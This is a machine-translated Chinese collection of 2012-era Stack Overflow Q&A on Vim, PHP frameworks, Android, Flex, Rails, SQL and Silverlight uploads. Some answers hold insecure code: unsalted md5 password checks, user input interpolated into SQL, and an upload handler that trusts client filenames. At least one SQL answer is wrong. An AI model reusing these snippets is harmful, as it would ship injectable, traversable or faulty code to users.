现在，当我单击用户控件的按钮时，单击事件不会触发。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:56:26.697

在 Page_Init() 而不是 Page_Load() 期间添加控件。这应该够了吧。

# vim - Vim 选择多行的结尾（块模式，但结尾列不同）

> ID：10772598
> 
> 赞同：39
> 
> 时间：2012-05-27T08:15:59.750
> 
> 标签：vim

vim 中有什么方法可以选择所有这些行的结尾吗？（我只在这些屏幕截图中显示行尾）。

在块模式下，如果底线长于其余部分，我可以全部获取它们，但如果底线较短，则截断较长的线。

编辑 | 我想我可以在选择之前用空格填充底线，然后再删除空格。

![在此处输入图像描述](../Images/02ce856adb6e937fba12415c0bf4cdca.png) ![在此处输入图像描述](../Images/644ad92177c02518c682eb63302142db.png)

* * *

## 回答 #1

> 赞同：71
> 
> 时间：2012-05-27T08:27:02.633

1.  将光标放在要成为该块一部分的左上角字符上。
2.  `ctrl`使用+进入块选择模式`v`
3.  **选择到行尾`$`**（这是您缺少的步骤；如果您使用移到第一行的末尾，`$`则选择也将延伸到后续行的末尾）
4.  向下移动 3 行`3``j`

Vim 文档中有关可视模式的部分有更多信息，您可以[在线阅读](http://vimdoc.sourceforge.net/htmldoc/visual.html#v_%24)，或者直接输入`:help v_$`Vim。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-05-27T19:45:08.653

或者，您可以设置`virtualedit`( `:h 'virtualedit'`) 设置，以便在任何时候处于可视块模式时，您都可以移动光标甚至超过行尾。例如`:set virtualedit=block`。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2017-06-08T19:00:49.583

1.  单击要附加文本的第一行中的某处（任意位置）。

2.  按`Control`+ `V`。

3.  按下`Down`以创建跨越所需行的任意垂直块选择。

4.  按下`$`可将可视块选择扩展到所选每行的末端。

5.  按`Shift`+`A`将文本附加到每个选定的行。

6.  键入要附加的文本。

7.  按下`Escape`，文本将附加到选定的行上。

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2015-04-25T18:02:06.587

如果您要选择每行的最后一个字符，例如，如果您想在每行末尾的引号后添加一些内容，您可以执行以下操作：

1.  将光标放在最后一个字符上（在本例中，第一行的最后一个引号）
2.  进入封锁模式：`control`+`V`
3.  向下移动以选择要更改的行数。
4.  **在行尾插入：`shift`+`A`**
5.  键入要添加的内容，然后退出可视模式
6.  您的文本现在应该插入到每个选定行的末尾！

希望这对像我这样寻找与上述类似但不完全相同的答案的人有所帮助。

# php - Codeigniter 类的执行行为

> ID：10772599
> 
> 赞同：0
> 
> 时间：2012-05-27T08:16:04.207
> 
> 标签：php, ajax, codeigniter

我正在使用 MY_Controller 来处理登录功能，问题是我不知道如何在 AJAX 请求发生时阻止 MY_Controller 被扩展。似乎 redirect() 将停止具有非 AJAX 请求的子类，是否可以停止为 AJAX 请求**执行**的子类？

```
function __construct() {
    parent::__construct();

    if(!$this->input->is_ajax_request()) {

        if(!$this->session->userdata('userid')) {
            //Render public menu in view
            $this->load->view('header_public_view');
            if($this->login_required()) {
                //Possibly change to render authentication view rather than redirect
                $this->session->set_userdata('destination', $this->input->server('REQUEST_URI'));
                redirect('authentication/login');
            }
        }
        else {
            $this->load->model('user_model');
            $data['user'] = $this->user_model->get_user($this->session->userdata('userid'));
            $this->load->view('header_user_view', $data);
        }

    }
    else {

        if(!this->session->userdata('userid') && $this->login_required) {

            //send response telling client to redirect  

        }

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T08:24:25.173

只需将所有 AJAX 功能放入一个单独的控制器中，该控制器不会扩展 MY_Controller

```
function Ajax_controller extends CI_Controller
{
    //code
} 
```

# java - AlphaAnimation：淡出作品，但不淡入

> ID：10772601
> 
> 赞同：1
> 
> 时间：2012-05-27T08:16:32.890
> 
> 标签：java, android, alpha

我有以下代码：

```
public boolean stopped = false;

public void fadeOut(final ImageView obj, final int time, int delay)
    {
        if(stopped)
        {
            stopped = false;
            anim = new AlphaAnimation(1.00f, 0.00f);
            anim.setDuration(time);
            if(delay > 0)
            {
                anim.setStartOffset(delay);
            }
            anim.setAnimationListener(new AnimationListener() {

                @Override
                public void onAnimationStart(Animation animation) {
                    // TODO Auto-generated method stub
                    Log.v("FADER", "Fading out. Duration: " + time + "ms.");

                }

                @Override
                public void onAnimationRepeat(Animation animation) {
                    // TODO Auto-generated method stub

                }

                @Override
                public void onAnimationEnd(Animation animation) {
                    // TODO Auto-generated method stub
                    Log.v("FADER", "Fading out finished.");
                    //obj.setAlpha(255);
                    stopped = true;
                }
            });
            obj.startAnimation(anim);
        }
    } 
```

这段代码工作正常。我的对象（一个 ImageView）漂亮地淡出。但是当我运行这个时：

```
public void fadeIn(final ImageView obj, final int time, int delay)
    {
        if(stopped)
        {
            stopped = false;
            anim = new AlphaAnimation(0, 1);
            anim.setDuration(time);
            if(delay > 0)
            {
                anim.setStartOffset(delay);
            }
            anim.setAnimationListener(new AnimationListener() {

                @Override
                public void onAnimationStart(Animation animation) {
                    // TODO Auto-generated method stub
                    Log.v("FADER", "Fading in. Duration: " + time + "ms.");

                }

                @Override
                public void onAnimationRepeat(Animation animation) {
                    // TODO Auto-generated method stub

                }

                @Override
                public void onAnimationEnd(Animation animation) {
                    // TODO Auto-generated method stub
                    Log.v("FADER", "Fading in finished.");
                    //obj.setAlpha(255);
                    stopped = true;
                }
            });
            obj.startAnimation(anim);
        }
    } 
```

它不起作用 - 没有淡入。`ImageView`保持完全透明。

这是为什么，有什么想法吗？

对于那些想知道的人，是的，我已经声明并设置了 boolean `stopped`，所以这不是问题，因为当我查看 LogCat 时，它会在运行`fadeIn()`函数时打印文本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T11:09:41.503

解决了！

事实证明，如果您使用`[ImageView Object].setAlpha`, 并将其设置`0`为例如，那么当您运行 时`AlphaAnimation`，它会在图像的边界`0`和当前 alpha 之间工作。

因此，如果您想在淡出后保持图像不可见，解决方案是使用，并在运行动画之前`[ImageView Object].setVisibility(View.INVISIBLE)`将其设置回。`View.VISIBLE`

任务完成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:35:41.407

您的视图的可见性是否设置为 View.VISIBLE？

# apache-flex - 如何使 Flex Air FileSystemTree 在包视图中显示

> ID：10772605
> 
> 赞同：0
> 
> 时间：2012-05-27T08:17:16.250
> 
> 标签：apache-flex, air, filesystems, package

我正在使用 Flex FileSystemTree。

在我的根文件夹中，我有一个文件夹，里面有 3 个文件。

为了使用 FileSystemTree 浏览我的文件，我需要打开我的根文件夹，打开我的内部文件夹，然后才能获取文件。

我希望如果文件夹没有文件，它将作为包显示，就像在 Eclipse 中一样。所以我只需要打开一个文件夹（root.innerfolder）

我希望我的问题很清楚，如果没有，请告诉我。

# javascript - 为什么 ExtJs 的大型企业级实现会使每个浏览器都崩溃？

> ID：10772608
> 
> 赞同：2
> 
> 时间：2012-05-27T08:17:40.627
> 
> 标签：javascript, extjs, enterprise, frontend

我正在研究 ExtJs 的实现，我认为它比它的制造商预期的要大。我们的页面实例化了超过 1000 个 ExtJs 组件。

第一个问题是，大多数情况下，单个页面加载需要 20-30 秒才能返回；在此期间，浏览器会显示一个转轮，指示正在使用某些资源。除了我们监控内存、硬盘驱动器、处理器和网络使用情况外，它们都没有被征税。服务器已经完成了它的请求，所以延迟显然是由 ExtJs 引起的。

第二个问题是，点击几下后，Firefox 显示“脚本缓慢”错误，Chrome 显示“Kill Page”错误，Safari 直接崩溃。

同样，RAM、硬盘驱动器、网络和处理器都几乎没有被使用，但浏览器无法处理创建 ExtJs 组件。

谁能指出我正确的方向来平衡 ExtJs，这样浏览器就不会那么不高兴了？

# php - Yii 框架：删除演示/管理员帐户

> ID：10772615
> 
> 赞同：5
> 
> 时间：2012-05-27T08:19:05.410
> 
> 标签：php, yii

所以我正在学习 Yii 框架，当你第一次创建 sceleton 应用程序时，内置的 admin/demo 帐户就是这样。我想删除它们，因为即使在上传到我的网络服务器后，我仍然可以使用它们登录。那么我在哪里可以删除呢？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-27T08:33:59.383

在文件夹*protected/components/*中，您将拥有一个文件*UserIdentity.php*，这些默认登录名出现在该文件中，您可以更改/删除它们。

您可以使用您的数据库对您的用户表进行身份验证，有点像这样：

```
class UserIdentity extends CUserIdentity
{
 private $_id;
 public function authenticate()
 {
     $record=User::model()->findByAttributes(array('username'=>$this->username));
     if($record===null)
         $this->errorCode=self::ERROR_USERNAME_INVALID;
     else if($record->password!==md5($this->password))
         $this->errorCode=self::ERROR_PASSWORD_INVALID;
     else
     {
         $this->_id=$record->id;
         $this->setState('title', $record->title);
         $this->errorCode=self::ERROR_NONE;
     }
     return !$this->errorCode;
 }

 public function getId()
 {
     return $this->_id;
 }
} 
```

检查[指南中的这篇文章](http://www.yiiframework.com/doc/guide/1.1/en/topics.auth)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-27T08:39:20.800

在 protected/components 下你会找到 UserIdentity.php，用户和他们的密码将在 authentication 函数中使用数组声明。

```
public function authenticate()
{
    $users=array(
        // username => password
        'demo'=>'demo',
        'admin'=>'admin',
    ); 
```

更多关于如何在 Yii 中使用身份验证的详细信息可以在 Yii官方文档的[身份验证和授权小节中找到](http://www.yiiframework.com/doc/guide/1.1/en/topics.auth)

# actionscript-3 - 通过 actionscript 3.0 使用 HTTP POST 上传 zip 文件

> ID：10772616
> 
> 赞同：2
> 
> 时间：2012-05-27T08:19:14.787
> 
> 标签：actionscript-3, http, post, file-upload

我有一个 zip 文件，它是通过在我的桌面 Flex 4.6 应用程序中的视图上拖放创建的。

这会触发一项服务，该服务将自动上传 zip 文件。

我可以使用以下代码将有关 zip 文件的元数据发送到服务器。

```
 var urlRequest:URLRequest = new URLRequest(PUBLISH_ZIP_FILE_URL);
        // set to method=POST
        urlRequest.method = URLRequestMethod.POST;          

        var params:URLVariables = new URLVariables();

        params['data[File][title]'] = 'Title1';
        params['data[File][description]'] = 'desc';         
        // params['data[File][filename]'] =  I am not sure exactly what to use here 
        // If this is a webpage, I expect to use input type="file" with the name as data[File][filename]

        urlRequest.data = params;

        addLoaderListeners();

        // set it such that data format is in variables
        loader.dataFormat = URLLoaderDataFormat.VARIABLES;

        loader.load(urlRequest); 
```

我已阅读[https://stackoverflow.com/questions/8837619/using-http-post-to-upload-a-file-to-a-website](https://stackoverflow.com/questions/8837619/using-http-post-to-upload-a-file-to-a-website)

但是，他们立即从 ByteArray 开始，我根本不知道如何转换我的 zip 文件。

请指教。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T09:07:56.743

令人尴尬，但我在发布问题 42 分钟后找到了答案。

这里正在解决一些橡皮鸭问题。

[http://www.codinghorror.com/blog/2012/03/rubber-duck-problem-solving.html](http://www.codinghorror.com/blog/2012/03/rubber-duck-problem-solving.html)

Short answer: Use File class and specifically the method [upload](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/FileReference.html#upload%28%29) which is extended from the [FileReference](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/FileReference.html) class.

Long answer:

```
 var urlRequest:URLRequest = new URLRequest(PUBLISH_ZIP_FILE_URL);
        // set to method=POST
        urlRequest.method = URLRequestMethod.POST;

        var params:URLVariables = new URLVariables();

        params['data[File][title]'] = 'Title1';
        params['data[File][description]'] = 'desc';

        // this is where we include those non file params and data
        urlRequest.data = params;

        // now we upload the file
        // this is how we set the form field expected for the file upload
        file.upload(urlRequest, "data[File][filename]"); 
```

# php - Twitter API：谁取消了我的关注？

> ID：10772623
> 
> 赞同：3
> 
> 时间：2012-05-27T08:20:32.437
> 
> 标签：php, twitter

如何找到取消关注我的人？

任何人都可以使用 Twitter API 拥有这样的 php 脚本。有必要将 Twitter 消息发送给那些退订我的人。

注意：我知道已经有特殊服务，但我需要您的简单服务，该服务将输出到我退订用户的推文中。

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T08:23:50.090

使用简单的 API 调用是不可能的，但您可以保存每个用户的关注者，并且每次检查时从旧数组中减去新数组。

基本上是这样的：

```
$array1 = get_old_followers_ids (); // ex. from db
$array2 = get("followers/ids.json?screen_name=me");
$users = array_diff($array1, $array2);
$users = get ("users/lookup.json?user_id=" . implode(',', $users)); 
```

`get`您的 API 调用函数在哪里。唯一的方法是轮询数据。

请注意，示例脚本有其局限性。例如，如果自上次保存值以来有超过 100 个用户取消关注您`$array1`，则只会返回 100 个用户。

# ruby-on-rails - 如何获取对象相关属性的 BEFORE 和 AFTER 状态？

> ID：10772626
> 
> 赞同：2
> 
> 时间：2012-05-27T08:21:37.593
> 
> 标签：ruby-on-rails

在我的应用程序中，我有以下关系：

```
Document has_and_belongs_to_many Users
User has_and_belongs_to_many Documents 
```

我想弄清楚的是如何执行以下操作：假设一个文档有 3 个属于它的用户。如果在更新后他们成为前任。4，我想向前 3 个发送电子邮件（document_updated），向第 4 个发送不同的电子邮件（document_assigned）。

**所以我必须在文档更新发生之前和之后知道属于我的文档的用户。**

到目前为止，我的方法是创建一个像这样的观察者：

```
class DocumentObserver < ActiveRecord::Observer

  def after_update(document)
    # this works because of ActiveModel::Dirty
    # @old_subject=document.subject_was    #subject is a Document attribute (string)

    # this is not working - I get an 'undefined method' error 
    @old_users=document.users_was   

    @new_users=document.users.all.dup

    # perform calculations to find out who the new users are and send emails....
  end
end 
```

我知道@old_users 获取有效值的机会很小，因为我猜它是由rails 通过has_and_belongs_to_many 关系动态填充的。

所以我的问题是：

如何在更新发生之前获取所有相关用户？

*（到目前为止我尝试过的其他一些事情：）*

A. 在 DocumentController::edit 中获取 document.users.all。这将返回一个有效的数组，但是我不知道如何将此数组传递给 DocumentObserver.after_update 以执行计算（只是在 DocumentController 中设置一个实例变量当然是行不通的）

B. 试图将 document.users 保存在 DocumentObserver::before_update 中。这也不起作用。我仍然得到新的用户价值

提前致谢

乔治

红宝石 1.9.2p320

导轨 3.1.0

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T08:37:53.627

你可以使用`before_add`回调

```
class Document
  has_and_belongs_to_many :users, :before_add => :do_stuff

  def  do_stuff(user)
  end
end 
```

当您将用户添加到文档时，将调用回调，此时`self.users`它仍将包含您正在添加的用户。

如果您需要更复杂的东西，`set_users`在文档上有一个方法可能会更简单

```
def set_users(new_user_set)
  existing = users
  new_users = users - new_user_set
  # send your emails
  self.users = new_user_set
end 
```

# android - android: WebView 和@font-face，每次重新加载字体

> ID：10772628
> 
> 赞同：2
> 
> 时间：2012-05-27T08:21:50.073
> 
> 标签：android, performance, webview, truetype

我正在使用 @font-face/loadDataWithBaseURL 在 WebView 中使用我自己的字体。它有效，但我面临性能问题。每次我用“loadDataWithBaseURL”更改 WebView 的内容时，它都会重新加载字体，并且需要几秒钟。

禁用@font-face，性能完美。

TTF 放在 assets 中，css/html 每次从一个 String 一起加载。

尝试使用缓存，但它似乎使用存储内存中的文件，所以也许没有区别。又或者是我用错了...

```
 myWebView.getSettings().setDomStorageEnabled(true);
    String appCachePath = getApplicationContext().getCacheDir().getAbsolutePath();
    myWebView.getSettings().setAppCachePath(appCachePath);
    myWebView.getSettings().setAppCacheMaxSize(1024*1024*20);
    myWebView.getSettings().setAllowFileAccess(true);
    myWebView.getSettings().setAppCacheEnabled(true); 
```

请帮忙。

更多信息：

应用程序内存使用量在每个 loaddata 中不断增长。

安卓版本 2.3.5。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T18:52:21.180

我找到了一种非常丑陋的方法来让它几乎不工作。仍然有一些内存泄漏，但没有以前那么多。

它包括删除 WebView 并再次创建它而不破坏它。

这样它就记住了字体！不要问我为什么，我看不懂。

“ll1”是我的 LinearLayout，其中 WebView 始终是最后一个视图。

```
 LayoutParams lparams = myWebView.getLayoutParams();
    ll1.removeView(myWebView);
    myWebView = new WebView(myWebView.getContext());
    myWebView.loadDataWithBaseURL(null, text, "text/html", null, null);
    myWebView.setOnTouchListener(this);
    myWebView.setOnLongClickListener(this);
    myWebView.setLayoutParams(lparams);
    ll1.addView(myWebView); 
```

也许内存泄漏是因为我在再次创建之前没有破坏或使对象为空，但这是我发现让它以良好的速度和内存使用率工作的唯一方法。

我希望有人可以解释这种行为或给出更好的解决方案。

# php - PHP计算财政年度

> ID：10772629
> 
> 赞同：3
> 
> 时间：2012-05-27T08:22:05.777
> 
> 标签：php, function, financial

我想使用 php 从 mysql 表中获取数据来计算财政年度。

要求是计算每个财政年度（3 月 31 日至 4 月 1 日）的学生分数。是否可以制作任何每年自行计算这些日期的函数？

我的学生考试成绩表正在存储考试日期（2012 年 9 月 2 日），并且今年（2011 年 9 月 2 日）的同一学生也有旧记录。我只想输出当年的。直到现在我无法得到这个，这是我的代码：-

```
$result1 = mysql_query(
    "SELECT SUM(score), SUM(score_from) 
     FROM school_test_report, school_students 
     WHERE (school_test_report.student_id = school_students.student_id and
school_test_report.class=school_students.class) 
     AND school_test_report.student_id='$id'
     AND school_test_report.subject = 'maths'
    /* something here to get dates  school_test_report.test_date is between 31 march to 1 April */"
)
or die(mysql_error());  
$row = mysql_fetch_assoc($result1);
echo $row['SUM(score)'].'/'. $row['SUM(score_from)']; 
```

它给我的不是一个财政年度的所有结果。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T11:43:40.520

在对日期执行计算时，最好扩展[DateTime](http://www.php.net/DateTime)类。这样可以将您的所有日期计算都封装在一个地方。随着时间的推移，您将建立一个非常有用的库。

要计算财政年度，您可以这样扩展 DateTime：-

```
class MyDateTime extends DateTime
{
    /**
    * Calculates start and end date of fiscal year
    * @param DateTime $dateToCheck A date withn the year to check
    * @return array('start' => timestamp of start date ,'end' => timestamp of end date) 
    */
    public function fiscalYear()
    {
        $result = array();
        $start = new DateTime();
        $start->setTime(0, 0, 0);
        $end = new DateTime();
        $end->setTime(23, 59, 59);
        $year = $this->format('Y');
        $start->setDate($year, 4, 1);
        if($start <= $this){
            $end->setDate($year +1, 3, 31);
        } else {
            $start->setDate($year - 1, 4, 1);
            $end->setDate($year, 3, 31);
        }
        $result['start'] = $start->getTimestamp();
        $result['end'] = $end->getTimestamp();
        return $result;
    }
} 
```

这将提供一个结果，您可以轻松地将其包含到您的查询中（如果可以的话，您应该真正将其更改为 mysqli 或 pdo）。

您可以像这样使用新功能：-

```
$mydate = new MyDateTime();    // will default to the current date time
$mydate->setDate(2011, 3, 31); //if you don't do this
$result = $mydate->fiscalYear();
var_dump(date(DATE_RFC3339, $result['start']));
var_dump(date(DATE_RFC3339, $result['end'])); 
```

如果您希望可以修改方法以将开始和结束日期作为 DateTime 对象返回：-

```
$result['start'] = $start;
$result['end'] = $end;
return $result; 
```

然后您可以直接格式化以包含在您的查询中：-

```
$mydate = new MyDateTime();
$mydate->setDate(2011, 3, 31);
$result = $mydate->fiscalYear();
$start = $result['start']->format('Y M d');
$end = $result['end']->format('Y M d'); 
```

[有关日期格式](http://us3.php.net/manual/en/function.date.php)，请参阅手册

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-02-10T10:43:07.703

```
/**
* Current financial year first date where financial year starts on 1st April
*/
$financialyeardate = 
(date('m')<'04') ? date('Y-04-01',strtotime('-1 year')) : date('Y-04-01'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T08:44:27.773

其他：

```
SELECT UNIX_TIMESTAMP(school_test_report.test_date) AS unixdate, ...
...
AND unixdate>=UNIX_TIMESTAMP('31-mar-<?php echo date("Y")-1; ?>') AND
AND unixdate<=UNIX_TIMESTAMP('1-apr-<?php echo date("Y"); ?>') 
```

我不知道还有什么。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-09-28T11:39:58.793

这个线程很老，但我想在上面的 vascowhites 答案中添加我的改进。

下面的课程将处理不同的财政年度，而不仅仅是北美的违约。

输出也更灵活一些

```
class FiscalYear extends DateTime {

    // the start and end of the fiscal year
    private $start;
    private $end;

    /**
     * 
     * Create a fiscal year object
     * 
     * @param type $time date you wish to determine the fiscal year in 'yyyy-mm-dd' format
     * @param type $fiscalstart optional fiscal year start month and day in 'mm-dd' format
     */
    public function __construct($time = null, $fiscalstart = '07-01') {
        parent::__construct($time,null);
        list($m, $d) = explode('-', $fiscalstart);
        $this->start = new DateTime();
        $this->start->setTime(0, 0, 0);
        $this->end = new DateTime();
        $this->end->setTime(23, 59, 59);
        $year = $this->format('Y');
        $this->start->setDate($year, $m, $d);
        $this->end = clone $this->start;
        if ($this->start <= $this) {
            $this->end->add(new DateInterval('P1Y'));
            $this->end->sub(new DateInterval('P1D'));
        } else {
            $this->start->sub(new DateInterval('P1Y'));
            $this->end->sub(new DateInterval('P1D'));
        }
    }

    /**
     * return the start of the fiscal year
     * @return type DateTime
     */
    public function Start() {
        return $this->start;
    }

    /**
     * return the end of the fiscal year
     * @return type DateTime
     */
    public function End() {
        return $this->end;
    }

}

echo 'Date: ';
$t1 = new FiscalYear('2015-07-02');
echo $t1->Format('Y-m-d');
echo '<br />Start: ';
echo $t1->Start()->Format('Y-m-d');
echo '<br />End: ';
echo $t1->End()->Format('Y-m-d');

echo '<br /><br />Date: ';
$t2 = new FiscalYear('2015-06-29');
echo $t2->Format('Y-m-d');
echo '<br />Start: ';
echo $t2->Start()->Format('Y-m-d');
echo '<br />End: ';
echo $t2->End()->Format('Y-m-d');

echo '<br /><br />Date: ';
$t3 = new FiscalYear('2015-07-02','04-01');
echo $t1->Format('Y-m-d');
echo '<br />Start: ';
echo $t3->Start()->Format('Y-m-d');
echo '<br />End: ';
echo $t3->End()->Format('Y-m-d');

echo '<br /><br />Date: ';
$t4 = new FiscalYear('2015-06-29','04-01');
echo $t4->Format('Y-m-d');
echo '<br />Start: ';
echo $t4->Start()->Format('Y-m-d');
echo '<br />End: ';
echo $t4->End()->Format('Y-m-d'); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-03-06T09:49:49.490

这很容易

```
$financial_year_to = (date('m') > 3) ? date('y') +1 : date('y');
$financial_year_from = $financial_year_to - 1;

$year= $financial_year_from .'-'.$financial_year_to; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-06-14T05:24:40.717

```
<?php
if(date('m')=="04"){
    $fyear = date('Y').'-'.(date('y')+1);
}
 if(date('m')=="05"){
    $fyear = date('Y').'-'.(date('y')+1);
}
 if(date('m')=="06"){
    $fyear = date('Y').'-'.(date('y')+1);
}
 if(date('m')=="07"){
    $fyear = date('Y').'-'.(date('y')+1);
}
 if(date('m')=="08"){
    $fyear = date('Y').'-'.(date('y')+1);
}
 if(date('m')=="09"){
    $fyear = date('Y').'-'.(date('y')+1);
}
 if(date('m')=="10"){
    $fyear = date('Y').'-'.(date('y')+1);
}
 if(date('m')=="11"){
    $fyear = date('Y').'-'.(date('y')+1);
}
 if(date('m')=="12"){
    $fyear = date('Y').'-'.(date('y')+1);
}
 if(date('m')=="01"){
    $fyear = (date('Y')-1).'-'.(date('y'));
}
 if(date('m')=="02"){
    $fyear = (date('Y')-1).'-'.(date('y'));
}
 if(date('m')=="03"){
    $fyear = (date('Y')-1).'-'.(date('y'));
} 
```

?>

# sql - SQL查询诸如“没有”之类的东西？

> ID：10772631
> 
> 赞同：6
> 
> 时间：2012-05-27T08:22:21.307
> 
> 标签：sql

我正在尝试编写一个查询，该查询将返回哪些主机缺少软件：

```
Host                    Software
A                       Title1
A                       Title2
A                       Title3 
B                       Title1
B                       Title3
C                       Title4
C                       Title3 
```

如何查询哪些主机缺少Title2（应该是B和C）？我已经尝试使用 COUNT 进行 GROUP BY、HAVING 和子查询，但我似乎没有正确的想法。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-27T13:26:06.370

我认为更简单的方法是：

```
select software
from HostSoftware hs
group by software
having max(case when software = 'Title2' then 1 else 0 end) = 0 
```

这不需要相关的子查询。而且，它应该会在大多数数据库上产生更好的执行计划。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-05-27T08:26:37.220

```
SELECT Host FROM HostSoftware
WHERE NOT EXISTS (
    SELECT * FROM HostSoftware AS InnerSoftware
    WHERE InnerSoftware.Host = HostSoftware.Host AND InnerSoftware.Software ='Title2'
) 
```

# asp.net - asp.net 中的 wait() （显示上传的图像）

> ID：10772632
> 
> 赞同：0
> 
> 时间：2012-05-27T08:22:45.567
> 
> 标签：asp.net, silverlight, image, wait

我想强迫我的程序在做某事后等待片刻，然后在 asp.net 和 silverlight 中做其他事情。（具体来说，我想通过silverlight程序上传图片，然后通过Image控件在我的页面中显示。但是当我上传大小约为6KB或更大的图像时，图像不显示，但是它有已成功上传。我认为稍等片刻可能会解决问题）有人可以指导我吗？谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T08:54:08.377

我使用[此页面中的代码](http://www.silverlight.net/archives/videos/openfiledialog-and-file-upload)

这是 MyPage.Xaml 中的代码：

```
 private void UploadBtn_Click(object sender, RoutedEventArgs e)
    {

        OpenFileDialog dlg = new OpenFileDialog();

        dlg.Multiselect = false;
        dlg.Filter = UPLOAD_DIALOG_FILTER;
        if ((bool)dlg.ShowDialog())
        {
            progressBar.Visibility = Visibility.Visible;
            progressBar.Value = 0;
            _fileName = dlg.File.Name;
            UploadFile(_fileName, dlg.File.OpenRead());

        }

        else
        {

            //user clicked cancel

        }

    }

    private void UploadFile(string fileName, Stream data)
    {
        // Just kept here
        progressBar.Maximum = data.Length;

        UriBuilder ub = new UriBuilder("http://mysite.com/receiver.ashx");

        ub.Query = string.Format("fileName={0}", fileName);
        WebClient c = new WebClient();

        c.OpenWriteCompleted += (sender, e) =>
        {

            PushData(data, e.Result);

            e.Result.Close();

            data.Close();

        };

        try
        {
            c.OpenWriteAsync(ub.Uri);
        }
        catch (Exception e)
        {
            MessageBox.Show(e.ToString());
        }

    }
    private void PushData(Stream input, Stream output)
    {
        byte[] buffer = new byte[input.Length];

        int bytesRead;
        while ((bytesRead = input.Read(buffer, 0, buffer.Length)) != 0)
        {
            output.Write(buffer, 0, buffer.Length);
        }
        progressBar.Value += input.Length;

        if (progressBar.Value >= progressBar.Maximum)
        {
            progressBar.Visibility = System.Windows.Visibility.Collapsed;
            loadImage();
        }
    }
private void loadImage()
    {
        Uri ur = new Uri("http://mysite.com/upload/" + _fileName);
        img1.Source = new BitmapImage(ur);
    } 
```

这是receiver.ashx：

```
public void ProcessRequest(HttpContext context)
{
    string filename = context.Request.QueryString["filename"].ToString(); using (FileStream fs = File.Create(context.Server.MapPath("~/upload/" + filename)))
    {

        SaveFile(context.Request.InputStream, fs);

    }

}
private void SaveFile(Stream stream, FileStream fs)
{

    byte[] buffer = new byte[stream.Length];

    int bytesRead;
    while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) != 0)
    {

        fs.Write(buffer, 0, bytesRead);

    }

} 
```

# random - 创建自相关随机值

> ID：10772635
> 
> 赞同：2
> 
> 时间：2012-05-27T08:22:55.853
> 
> 标签：random, time-series, correlation, lag

我们正在尝试创建将用作时间序列的自相关随机值。我们没有引用的现有数据，只想从头开始创建向量。

一方面，我们当然需要一个具有分布及其 SD 的随机过程。

另一方面，必须描述影响随机过程的自相关。向量的值与在几个时间间隔内降低的强度自相关。例如 lag1 有 0.5、lag2 0.3、lag1 0.1 等。

所以最后向量应该看起来像：

```
2, 4, 7, 11, 10 , 8 , 5, 4, 2, -1, 2, 5, 9, 12, 13, 10, 8, 4, 3, 1, -2, -5 
```

等等。

# android - 使用 android 和 GPS 控制机器人机车

> ID：10772636
> 
> 赞同：1
> 
> 时间：2012-05-27T08:23:02.927
> 
> 标签：android, gps, controls, robotics

项目目标是这样的：

我们将有一个带有车载 GPS 的机车机器人。现在使用该 GPS，我们想要跟踪机器人的位置并在 android 手机上跟踪它。（因为它们提供与 Google 服务的最佳界面）

不仅

我们甚至想通过安卓手机控制机器人。是否可以从android手机向该机器人发送控制信号，以便机器人可以根据控制信号进行移动。

我们如何在android手机和机器人车载GPS之间建立连接。（我们对机器人技术有点新手）

任何更好的想法，建议是最受欢迎的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-01T15:43:04.057

我正在做类似的事情，我正在尝试制作一个能够根据一些广泛的机器人算法自行移动的自主机器人，但当然你不需要那个。

但我认为最好将 Android 手机安装在机器人上，然后通过 WiFi 或任何其他介质用笔记本电脑控制它。

安装安卓手机会有很多好处，比如：

1.  拥有一个不错的 GPS，无需额外工作即可将其与其他硬件和软件集成。

2.  您还可以拥有其他硬件，例如加速度计、接近传感器、重力传感器等，这些硬件在很多方面都很有用。

现在有大量的数据用于制作基于 Android 的机器人。这是 他们致力于从 android 制造机器人并通过笔记本电脑或 Android 远程控制它们 的[Cellbots 。](http://www.cellbots.com)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-08T13:48:42.177

查看 Dension Wirc 模块：

[Dension 的 WiRC 模块](http://wirc.dension.com/) 它通过发送脉冲宽度调制列车适用于 RC 控制平台，允许您控制伺服系统和电子速度控制器。有8个频道。我用它来控制 2 个轨道和一个平移/倾斜炮塔，**效果很好。**我给支持团队发了电子邮件，他们给我发了一个 iPhone 项目，这让我在几个小时内就能运行起来。WiRC 套件带有一个摄像头，因此我可以通过 wifi 远程驱动我的机器人。

GPS方面，我在iPhone上做了一个测试，在晴朗的天空下，GPS信号漂移很厉害。精度确实在30-50英尺之间，精确跟踪小型机器人的位置是不够的。我将发布我的实验的屏幕截图。

